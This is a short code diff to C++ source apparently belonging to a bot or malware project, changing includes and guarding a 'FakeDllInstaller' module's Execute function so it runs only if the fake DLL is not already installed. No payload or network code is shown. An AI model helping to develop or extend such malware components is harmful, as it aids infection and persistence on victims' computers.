@@ -11,15 +11,12 @@
 #include <shlobj.h>
 
 
-#include "GetApi.h"
-#include "Memory.h"
-#include "Strings.h"
+#include "BotCore.h"
 #include "Loader.h"
 #include "Utils.h"
 #include "Task.h"
 #include "StrConsts.h"
 #include "FakeDllInstaller.h"
-#include "Utils.h"
 
 
 #include "BotDebug.h"
@@ -852,7 +849,8 @@ namespace FDI
 //------------------------------------------------------
 void FDI::Execute()
 {
-	StartThread(DoExecute, 0);
+	if (!BOT::FakeDllInstalled())
+		StartThread(DoExecute, 0);
 }
 
 
